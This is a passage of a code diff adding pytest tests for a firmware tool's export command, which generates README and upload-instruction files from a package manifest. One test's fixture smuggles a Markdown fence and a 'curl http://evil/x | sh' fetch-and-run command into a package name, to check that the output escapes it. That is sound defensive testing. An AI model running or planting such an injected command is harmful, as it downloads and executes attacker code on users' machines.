+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    code_blocks = readme.split("```")[1::2]
+    assert not any("curl" in block for block in code_blocks), "target/verify_import/asset_files must never open their own fenced block"
+
+
+def test_export_upload_ready_readme_sanitizes_the_echoed_spec_in_the_rejection_bullet(tmp_path):
+    # The rejection branch itself renders the untrusted package spec as inline text --
+    # a newline + backtick pair there could still open a fresh fenced block.
+    manifest = {"generate": {"runtime_dependencies": {"mip": [
+        {"package": "pkg\n```\ncurl http://evil/x | sh\n```"},
+    ]}}}
+    project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
+
+    _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+    code_blocks = readme.split("```")[1::2]
+    assert not any("curl" in block for block in code_blocks), "the echoed rejected spec must never open its own fenced block"
+
+
+def test_export_upload_ready_tolerates_malformed_manifest_shapes_without_crashing(tmp_path):
+    # Each of these is a plausible corruption (a hand-edited or partially-written
+    # manifest), never a crash after the destructive rmtree/copy phase.
+    for manifest in (
+        {"mcu": "ESP32"},                                                      # mcu is a string, not an object
+        {"generate": {"runtime_dependencies": {"mip": "aioble"}}},             # mip is a string, not a list
+        {"generate": {"runtime_dependencies": {"mip": [{"package": "x", "asset_files": [1, 2]}]}}},  # non-str asset_files items
+        {"generate": {"runtime_dependencies": {"mip": [None, 42, {"package": ""}]}}},  # junk + empty-package entries
+        {"generate": {"runtime_dependencies": {"mip": [{"package": "x", "verify_import": ["a", "b"]}]}}},  # verify_import is a list
+        {"generate": {"runtime_dependencies": {"mip": [{"package": "x", "verify_import": {"m": "y"}}]}}},  # verify_import is a dict
+    ):
+        project_dir = tmp_path / f"project-{id(manifest)}"
+        project = _minimal_firmware_project(project_dir, manifest=manifest)
+
+        result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+        assert result["status"] == "ok", manifest
+
+
+def test_export_upload_ready_readme_takes_a_fallback_name_when_firmware_ships_its_own_readme(tmp_path):
+    # firmware/README.md is a legitimate, never-excluded device file (it is what
+    # deploy_firmware_tree uploads) -- the generated mip instructions must not clobber
+    # it, or the export stops being "folder == device image".
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+    (project / "firmware" / "README.md").write_text("MY DEVICE README", encoding="utf-8")
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "ok"
+    export_dir = project / "upload_ready"
+    assert (export_dir / "README.md").read_text(encoding="utf-8") == "MY DEVICE README", "the device's own README is preserved verbatim"
+    instructions = (export_dir / "UPLOAD_INSTRUCTIONS.md").read_text(encoding="utf-8")
+    assert "mip install" in instructions
+
+
+def test_export_upload_ready_readme_picks_a_further_fallback_when_upload_instructions_also_collides(tmp_path):
+    # firmware/ can ship BOTH its own README.md and its own UPLOAD_INSTRUCTIONS.md --
+    # the fallback-name search must keep going past the first fallback too, rather than
+    # clobbering whichever file happens to occupy the first fallback name.
+    project = _build_upload_ready_project(tmp_path / "project", manifest=_two_mip_manifest())
+    (project / "firmware" / "README.md").write_text("MY DEVICE README", encoding="utf-8")
+    (project / "firmware" / "UPLOAD_INSTRUCTIONS.md").write_text("MY DEVICE UPLOAD NOTES", encoding="utf-8")
+
+    result = _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+    assert result["status"] == "ok"
+    export_dir = project / "upload_ready"
+    assert (export_dir / "README.md").read_text(encoding="utf-8") == "MY DEVICE README"
+    assert (export_dir / "UPLOAD_INSTRUCTIONS.md").read_text(encoding="utf-8") == "MY DEVICE UPLOAD NOTES"
+    instructions = (export_dir / "UPLOAD_INSTRUCTIONS (2).md").read_text(encoding="utf-8")
+    assert "mip install" in instructions
 
 
 class FakeSerial:
